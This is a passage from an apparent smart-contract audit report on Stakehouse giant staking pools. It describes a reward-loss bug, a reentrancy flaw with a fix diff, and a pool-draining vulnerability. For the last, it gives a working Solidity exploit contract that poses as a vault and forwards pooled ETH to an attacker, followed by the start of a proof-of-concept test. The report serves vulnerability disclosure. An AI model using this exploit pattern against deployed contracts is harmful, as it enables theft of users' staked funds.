href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L33-L48\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L33-L48</a><br></p>\n<p>When <code>depositETH()</code> is called in giant pool it calls <code>_onDepositETH()</code> which calls <code>_setClaimedToMax()</code> to make sure new ETH stakers are not entitled to ETH earned by but this can cause users to lose their remaining rewards when they deposits. code should first transfer user remaining rewards when deposit happens.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>depositETH()</code> code in <code>GiantPoolBase</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function depositETH(uint256 _amount) public payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(msg.value &gt;= MIN_STAKING_AMOUNT, &quot;Minimum not supplied&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(msg.value == _amount, &quot;Value equal to amount&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // The ETH capital has not yet been deployed to a liquid staking network</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        idleETH += msg.value;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Mint giant LP at ratio of 1:1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lpTokenETH.mint(msg.sender, msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // If anything extra needs to be done</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _onDepositETH();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit ETHDeposited(msg.sender, msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see it increase user <code>lpTokenETH</code> balance and then calls <code>_onDepositETH()</code>. This is <code>_onDepositETH()</code> and <code>_setClaimedToMax()</code> code in <code>GiantMevAndFeesPool</code> contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _onDepositETH() internal override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _setClaimedToMax(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @dev Internal re-usable method for setting claimed to max for msg.sender</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _setClaimedToMax(address _user) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // New ETH stakers are not entitled to ETH earned by</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see the code set <code>claimed[msg.sender][address(lpTokenETH]</code> to maximum value so the user wouldn’t be entitled to previous rewards but if user had some remaining rewards in contract he would lose those rewards can’t withdraw them. these are the steps:</p>\n<ol>\n<li><code>user1</code> deposit <code>10</code> ETH to giant pool and <code>accumulatedETHPerLPShare</code> value is <code>2</code> and <code>claimed[user1][lpTokenETH]</code> would be <code>10 * 2 = 20</code>.</li>\n<li>some time passes and <code>accumulatedETHPerLPShare</code> set to <code>4</code> and <code>user1</code> has <code>10 * 4 - 20 = 20</code> unclaimed ETH rewards (the formula in the code: <code>balance * rewardPerShare - claimed</code>).</li>\n<li><code>user</code> deposit <code>5</code> ETH to giant pool and <code>accumulatedETHPerLPShare</code> is <code>4</code> so the code would call <code>_onDepositETH()</code> which calls <code>_setClaimedToMax</code> which sets <code>claimed[user1][lpTokenETH]</code> to <code>15 * 4 = 60</code>.</li>\n<li><code>user1</code> new remaining ETH reward would be <code>15 * 4 - 60 = 0</code>. and <code>user1</code> won’t receive his rewards because when he deposits contract don’t transfer remaining rewards and set claim to max so user loses his funds.</li>\n</ol>\n<h3 id=\"tools-used-11\" style=\"position:relative;\"><a href=\"#tools-used-11\" aria-label=\"tools used 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When deposit happens, contract should first send remaining rewards, then increase the user’s balance and then set the user claim to max.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-16-reentrancy-vulnerability-in-giantmevandfeespoolwithdraweth\" style=\"position:relative;\"><a href=\"#h-16-reentrancy-vulnerability-in-giantmevandfeespoolwithdraweth\" aria-label=\"h 16 reentrancy vulnerability in giantmevandfeespoolwithdraweth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244\">[H-16] Reentrancy vulnerability in GiantMevAndFeesPool.withdrawETH</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244\">cccz</a></em></p>\n<p>GiantMevAndFeesPool.withdrawETH calls lpTokenETH.burn, then GiantMevAndFeesPool.beforeTokenTransfer, followed by a call to _distributeETHRewardsToUserForToken sends ETH to the user, which allows the user to call any function in the fallback. While GiantMevAndFeesPool.withdrawETH has the nonReentrant modifier, GiantMevAndFeesPool.claimRewards does not have the nonReentrant modifier.<br>\nWhen GiantMevAndFeesPool.claimRewards is called in GiantMevAndFeesPool.withdrawETH, the idleETH is reduced but the ETH is not yet sent to the user, which increases totalRewardsReceived and accumulatedETHPerLPShare, thus making the user receive more rewards when calling GiantMevAndFeesPool.claimRewards.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64</a></p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">function withdrawETH(uint256 _amount) external nonReentrant {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(_amount &gt;= MIN_STAKING_AMOUNT, &quot;Invalid amount&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(lpTokenETH.balanceOf(msg.sender) &gt;= _amount, &quot;Invalid balance&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(idleETH &gt;= _amount, &quot;Come back later or withdraw less ETH&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  idleETH -= _amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    lpTokenETH.burn(msg.sender, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  idleETH -= _amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (bool success,) = msg.sender.call{value: _amount}(&quot;&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(success, &quot;Failed to transfer ETH&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    emit LPBurnedForETH(msg.sender, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-17-giant-pools-can-be-drained-due-to-weak-vault-authenticity-check\" style=\"position:relative;\"><a href=\"#h-17-giant-pools-can-be-drained-due-to-weak-vault-authenticity-check\" aria-label=\"h 17 giant pools can be drained due to weak vault authenticity check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251\">[H-17] Giant pools can be drained due to weak vault authenticity check</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/420\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/361\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/325\">immeas</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/307\">JTJabba</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/301\">arcoun</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/282\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/266\">imare</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/258\">wait</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/220\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/195\">satoshipotato</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/166\">ronnyx2017</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/139\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/136\">hihen</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/128\">bitbopper</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/122\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/112\">banky</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/96\">9svR6w</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/87\">c7e7eff</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/61\">perseverancesuccess</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/47\">0xdeadbeef0x</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/36\">clems4ever</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50\">https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44\">https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44</a></p>\n<p>An attacker can withdraw all ETH staked by users in a Giant pool. Both <code>GiantSavETHVaultPool</code> and <code>GiantMevAndFeesPool</code> are affected.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>batchDepositETHForStaking</code> function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58\">GiantSavETHVaultPool.sol#L48-L58</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">SavETHVault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">savETHPool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">SavETHVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_savETHVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">liquidStakingDerivativeFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isLiquidStakingManager</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">liquidStakingManager</span><span class=\"mtk1\">())),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">&quot;Invalid liquid staking manager&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Deposit ETH for staking of BLS key</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">savETHPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">batchDepositETHForStaking</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">transactionAmount</span><span class=\"mtk1\"> }(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_stakeAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>An attacker can pass an exploit contract as a vault. The exploit contract will implement <code>liquidStakingManager</code> that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// test/foundry/GiantPools.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GiantPoolExploit</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validStakingManager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validStakingManager_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">validStakingManager</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">validStakingManager_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">liquidStakingManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validStakingManager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">batchDepositETHForStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk3\">/*_blsPublicKeyOfKnots*/</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk3\">/*_amounts*/</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testPoolDraining_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Register BLS key</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk7\">12</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">registerSingleBLSPubKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">accountFour</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Set up users and ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountThree</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\">, </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x1337</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">label</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span 